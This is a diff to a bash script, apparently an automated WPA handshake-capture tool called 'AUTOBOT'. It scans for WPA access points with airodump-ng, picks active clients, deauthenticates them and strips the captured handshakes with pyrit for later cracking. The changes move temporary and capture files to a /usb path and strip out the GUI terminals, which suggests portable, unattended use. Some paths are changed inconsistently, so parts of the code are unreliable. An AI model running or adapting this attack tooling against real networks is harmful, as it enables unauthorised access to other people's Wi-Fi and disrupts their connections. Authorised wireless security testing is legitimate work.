@@ -79,21 +79,21 @@ fbotstart()																#Automagically find active clients and collect new ha
 	echo " [*] CLIENT: "
 	echo " [*] CHANNEL: "
 	echo " [*] POWER: ";$COLOR2 9
-	gnome-terminal --geometry=130x50+0+200 -x airodump-ng mon0 -f 500 -a -w $HOME/tmp -o csv --encrypt WPA&
+	airodump-ng mon0 -f 500 -a -w $HOME/tmp -o csv --encrypt WPA&
 	DONE=""
 	MNUM=0
 	LNUM=0
-	sort -u $HOME/Desktop/cap/handshakes/got > $HOME/Desktop/cap/handshakes/got2
-	mv $HOME/Desktop/cap/handshakes/got2 $HOME/Desktop/cap/handshakes/got
+	sort -u /usb/cap/handshakes/got > /usb/cap/handshakes/got2
+	mv /usb/cap/handshakes/got2 /usb/cap/handshakes/got
 	modprobe pcspkr
 	fhunt
 }
 
 fhunt()																	#find new active clients that havn't been handshaked yet for autobot
 {
-	rm -rf $HOME/tmp5 2> /dev/null
+	rm -rf /usb/tmp5 2> /dev/null
 	sleep 0.7
-	if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
+	if [ ! -f /usb/tmp-01.csv ] 2> /dev/null
 		then
 			sleep 1
 			fhunt
@@ -103,27 +103,27 @@ fhunt()																	#find new active clients that havn't been handshaked yet
 		then
 			fhunt
 	fi
-	echo "$BSSIDS" > $HOME/tmp6
+	echo "$BSSIDS" > /usb/tmp6
 	while read LINE
 		do
-			if [ $( cat $HOME/Desktop/cap/handshakes/got | grep $LINE) -z ] 2> /dev/null
+			if [ $( cat /usb/cap/handshakes/got | grep $LINE) -z ] 2> /dev/null
 				then
-					echo "$LINE" >> $HOME/tmp7
+					echo "$LINE" >> /usb/tmp7
 			fi
-		done <$HOME/tmp6
-	if [ -f $HOME/tmp7 ] 2> /dev/null
+		done </usb/tmp6
+	if [ -f /usb/tmp7 ] 2> /dev/null
 		then
-			BSSIDS=$(cat $HOME/tmp7)
+			BSSIDS=$(cat /usb/tmp7)
 		else
 			fhunt
 	fi
-	MCNT=$(wc -l $HOME/tmp7)
+	MCNT=$(wc -l /usb/tmp7)
 	MCNT=${MCNT:0:2}
 	if [ $MCNT -le 9 ] 2> /dev/null
 		then
 			MCNT=${MCNT:0:1}
 	fi
-	rm -rf $HOME/tmp7
+	rm -rf /usb/tmp7
 	if [ $MNUM -ge $MCNT ] 2> /dev/null
 		then
 			MNUM=0
@@ -134,27 +134,27 @@ fhunt()																	#find new active clients that havn't been handshaked yet
 		then
 			fhunt
 	fi
-	ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
+	ESSID=$(cat /usb/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
 	ESSID=${ESSID:1}
 	if [ $ESSID -z ] 2>/dev/null
 		then
 			fhunt
 		else
-			cat $HOME/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > $HOME/tmp4
+			cat /usb/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > /usb/tmp4
 			while read LINE
 				do
 					if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
 						then
 							A=1
 						else
-							echo "$LINE" >> $HOME/tmp5
+							echo "$LINE" >> /usb/tmp5
 					fi
-				done < $HOME/tmp4
-			POWER=$(cat $HOME/tmp5 | grep $BSSID | head -n 1 | cut -d ',' -f 1)
+				done < /usb/tmp4
+			POWER=$(cat /usb/tmp5 | grep $BSSID | head -n 1 | cut -d ',' -f 1)
 			POWER=${POWER:1}
-			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
+			CHAN=$(cat /usb/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
 			CHAN=$((CHAN + 1 - 1))
-			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
+			CLIE=$(cat /usb/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
 			clear
 			$COLOR 1;$COLOR2 2;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
 			echo
@@ -177,9 +177,9 @@ fhunt()																	#find new active clients that havn't been handshaked yet
 fautocap()
 {
 	killall airodump-ng
-	rm -rf $HOME/tmp*
+	rm -rf /usb/tmp*
 	sleep 0.2
-	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
+	airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 	DONE=""
 	CLINUM=1
 	DECNT=0
@@ -189,18 +189,18 @@ fautocap()
 		do
 			if [ $DEPASS = "1" ] 2> /dev/null
 				then
-					echo "$(cat $HOME/tmp1-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 1 | sort -u)" > $HOME/tmp8
-					CLICNT=$(wc -l $HOME/tmp8)
+					echo "$(cat $HOME/tmp1-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 1 | sort -u)" > /usb/tmp8
+					CLICNT=$(wc -l /usb/tmp8)
 					CLICNT=${CLICNT:0:1}
 					if [ $CLINUM -gt $CLICNT ] 2> /dev/null
 						then
 							CLINUM=1
 					fi
-					if [ $(cat $HOME/tmp8) -z ] 2> /dev/null
+					if [ $(cat /usb/tmp8) -z ] 2> /dev/null
 						then
 							A=1
 						else
-							CLIE=$(cat $HOME/tmp8 | sed -n "$CLINUM"p)
+							CLIE=$(cat /usb/tmp8 | sed -n "$CLINUM"p)
 							CLINUM=$((CLINUM + 1))
 					fi
 					
@@ -240,10 +240,10 @@ fautocap()
 			fi
 					
 		done
-	beep -f 1200 -l 3 -r 2
-	beep -f 1500 -l 3 -r 1
-	beep -f 1600 -l 5 -r 1
-	beep -f 1800 -l 3 -r 1
+#	beep -f 1200 -l 3 -r 2
+#	beep -f 1500 -l 3 -r 1
+#	beep -f 1600 -l 5 -r 1
+#	beep -f 1800 -l 3 -r 1
 	clear
 	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! [*] ";$COLOR 9;$COLOR2 9
 	echo
@@ -254,8 +254,8 @@ fautocap()
 	echo
 	GDONE=""
 	killall airodump-ng
-	echo "$ESSID - BSSID:$BSSID CH:$CHAN" >> $HOME/Desktop/cap/handshakes/got
-	pyrit -r $HOME/tmp1-01.cap -o "$HOME/Desktop/cap/handshakes/$ESSID-$DATE.cap" strip | grep 'New pcap-file'
+	echo "$ESSID - BSSID:$BSSID CH:$CHAN" >> /usb/cap/handshakes/got
+	pyrit -r $HOME/tmp1-01.cap -o "/usb/cap/handshakes/$ESSID-$DATE.cap" strip | grep 'New pcap-file'
 	$COLOR 2;echo $ANALYZE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
 	rm -rf $HOME/tmp*
 	sleep 2
@@ -268,7 +268,7 @@ fanalyze()																#Analyze handshakes
 	while [ $(echo $ANALYZE | grep $BSSID) -z ] 2> /dev/null
 		do
 			sleep 0.5
-			ANALYZE=$(pyrit -r $HOME/tmp1-01.cap analyze 3> /dev/null)
+			ANALYZE=$(pyrit -r /usb/tmp1-01.cap analyze 3> /dev/null)
 			if  [ $(echo $ANALYZE | grep "$ESSID") -z ] 2> /dev/null
 				then
 					A=1
@@ -279,28 +279,28 @@ fanalyze()																#Analyze handshakes
 
 	while [ $DONE2 -z ] 2> /dev/null
 		do
-			echo "$ANALYZE" > $HOME/tmp4
+			echo "$ANALYZE" > /usb/tmp4
 			if  [ $(echo $ANALYZE | grep "$ESSID") -z ] 2> /dev/null
 				then
 					A=1
 				else
 					DONE2=1
 			fi
-			if [ $(cat $HOME/tmp4 | grep "bad") -z ] 2> /dev/null
+			if [ $(cat /usb/tmp4 | grep "bad") -z ] 2> /dev/null
 				then
 					A=1
 				else
 					DONE2=1
 			fi
 			
-			if [ $(cat $HOME/tmp4 | grep "workable") -z ] 2> /dev/null
+			if [ $(cat /usb/tmp4 | grep "workable") -z ] 2> /dev/null
 				then
 					A=1
 				else
 					DONE2=1
 					GDONE=1
 			fi
-			if [ $(cat $HOME/tmp4 | grep "good") -z ] 2> /dev/null
+			if [ $(cat /usb/tmp4 | grep "good") -z ] 2> /dev/null
 				then
 					A=1
 				else
@@ -315,12 +315,12 @@ fanalyze()																#Analyze handshakes
 fapscan()																#Determine target AP BSSID and channel
 {
 	clear
-	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv --encrypt WPA&
+	airodump-ng mon0 -a -w /usb/tmp -o csv --encrypt WPA&
 	$COLOR 2;echo " [*] Scanning for AP's with names like $PARTIALESSID [*] ";$COLOR 9
 	while [ $DONE -z ] 2> /dev/null
 		do
 			sleep 0.3
-			if [ -f $HOME/tmp-01.csv ] 2> /dev/null
+			if [ -f /usb/tmp-01.csv ] 2> /dev/null
 				then
 					DONE=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID)
 					ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
@@ -333,27 +333,27 @@ fapscan()																#Determine target AP BSSID and channel
 	sleep 0.5
 	killall airodump-ng
 	ESSID=${ESSID:1}
-	CHAN=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -n 1)
+	CHAN=$(cat /usb/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -n 1)
 	CHAN=$((CHAN + 1 - 1))
-	cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -n 1 > $HOME/tmp4.csv
-	BSSID=$(cat $HOME/tmp4.csv)
+	cat /usb/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -n 1 > /usb/tmp4.csv
+	BSSID=$(cat /usb/tmp4.csv)
 	fclientscan
 }
 
 flistap()																#List all APs
 {
-	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv --encrypt WPA&
+	airodump-ng mon0 -a -w /usb/tmp -o csv --encrypt WPA&
 	clear
 	$COLOR 4;echo " [*] Scanning for APs, Please wait.. ";$COLOR 9
 	sleep 10
 	killall airodump-ng
-	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp1
+	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > /usb/tmp1
 	LNUM=0
 	while read LINE
 		do
 			LNUM=$((LNUM + 1))
 			case $LNUM in 1)ESSID1=" [1] $LINE";;2)ESSID2=" [2] $LINE";;3)ESSID3=" [3] $LINE";;4)ESSID4=" [4] $LINE";;5)ESSID5=" [5] $LINE";;6)ESSID6=" [6] $LINE";;7)ESSID7=" [7] $LINE";;8)ESSID8=" [8] $LINE";;9)ESSID9=" [9] $LINE";;10)ESSID10=" [10] $LINE";;11)ESSID11=" [11] $LINE";;12)ESSID12=" [12] $LINE";;13)ESSID13=" [13] $LINE";;14)ESSID14=" [14] $LINE";;15)ESSID15=" [15] $LINE";;16)ESSID16=" [16] $LINE";;17)ESSID17=" [17] $LINE";;18)ESSID18=" [18] $LINE";;19)ESSID19=" [19] $LINE";;20)ESSID20=" [20] $LINE";;21)ESSID21=" [21] $LINE";;22)ESSID22=" [22] $LINE";;23)ESSID23=" [23] $LINE";;24)ESSID24=" [24] $LINE";;25)ESSID25=" [25] $LINE";;26)ESSID26=" [26] $LINE";;27)ESSID27=" [27] $LINE"  ;esac
-		done <$HOME/tmp1
+		done </usb/tmp1
 	clear
 	if [ $LNUM -gt 27 ] 2> /dev/null
 		then
@@ -369,34 +369,34 @@ flistap()																#List all APs
 	$COLOR 4;echo " [>] Please choose an AP ";$COLOR 9
 	read -p "  >" AP
 	case $AP in 1)ESSID=${ESSID1:5};;2)ESSID=${ESSID2:5};;3)ESSID=${ESSID3:5};;4)ESSID=${ESSID4:5};;5)ESSID=${ESSID5:5};;6)ESSID=${ESSID6:5};;7)ESSID=${ESSID7:5};;8)ESSID=${ESSID8:5};;9)ESSID=${ESSID9:5};;10)ESSID=${ESSID10:5};;11)ESSID=${ESSID11:5};;12)ESSID=${ESSID12:5};;13)ESSID=${ESSID13:5};;14)ESSID=${ESSID14:5};;15)ESSID=${ESSID15:5};;16)ESSID=${ESSID16:5};;17)ESSID=${ESSID17:5};;18)ESSID=${ESSID18:5};;19)ESSID=${ESSID19:5};;20)ESSID=${ESSID20:5};;21)ESSID=${ESSID21:5};;22)ESSID=${ESSID22:5};;23)ESSID=${ESSID23:5};;24)ESSID=${ESSID24:5};;25)ESSID=${ESSID25:5};;26)ESSID=${ESSID26:5};;27)ESSID=${ESSID27:5};esac
-	BSSID=$(cat $HOME/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 1)
-	CHAN=$(cat $HOME/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 4)
+	BSSID=$(cat /usb/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 1)
+	CHAN=$(cat /usb/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 4)
 	CHAN=$((CHAN + 1 - 1))
 	fclientscan
 }
 
 fclientscan()															#Find active clients
 {
-	rm -rf $HOME/tmp* 2> /dev/null
+	rm -rf /usb/tmp* 2> /dev/null
 	CNT="0"
 	clear
 	$COLOR 2;echo " [*] Attacking $ESSID BSSID:$BSSID CHANNEL:$CHAN [*] "
 	echo
 	$COLOR 4;echo ' [*] Please wait while I find active clients.. [*] ';$COLOR 9
-	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
+	airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 	DONE=""
 	while [ $DONE -z ] 2> /dev/null
 		do
 			sleep 0.3
-			DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
+			DONE=$(cat /usb/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
 		done
-	DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
-	echo "$DONE" > $HOME/tmp
+	DONE=$(cat /usb/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
+	echo "$DONE" > /usb/tmp
 	while read LINE
 		do
-			echo "${LINE:0:17}" >> $HOME/tmp1
-		done <$HOME/tmp
-	CNT=$(wc -l $HOME/tmp)
+			echo "${LINE:0:17}" >> /usb/tmp1
+		done </usb/tmp
+	CNT=$(wc -l /usb/tmp)
 	CNT=${CNT:0:2}
 	if [ ${CNT:1:1} = " " ] 2> /dev/null
 		then
@@ -410,17 +410,17 @@ fcap()																	#Deauth, capture and strip handshakes
 	CHKEX="0"
 	if [ $CNT = 1 ] 2> /dev/null
 		then
-			CLIE=$(head -n 1 $HOME/tmp1)
+			CLIE=$(head -n 1 /usb/tmp1)
 		else
 			$COLOR 2;echo " [*] $CNT active clients found: ";$COLOR 9
-			cat $HOME/tmp1
+			cat /usb/tmp1
 			echo
 			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one: ";$COLOR 9 
 			read -p "  >" CLIE
 	fi
 	if [ $CLIE -z ] 2> /dev/null
 		then
-			CLIE=$(head -n 1 $HOME/tmp1)
+			CLIE=$(head -n 1 /usb/tmp1)
 	fi
 	DONE=""
 	while [ $DONE -z ] 2> /dev/null
@@ -446,7 +446,7 @@ fcap()																	#Deauth, capture and strip handshakes
 	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
 	killall airodump-ng
 	clear
-	if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2>/dev/null
+	if [ $(cat /cap/handshakes/got | grep $BSSID) -z ] 2>/dev/null
 		then
 			echo "$ESSID - BSSID:$BSSID CH:$CHAN" >> $HOME/Desktop/cap/handshakes/got
 	fi
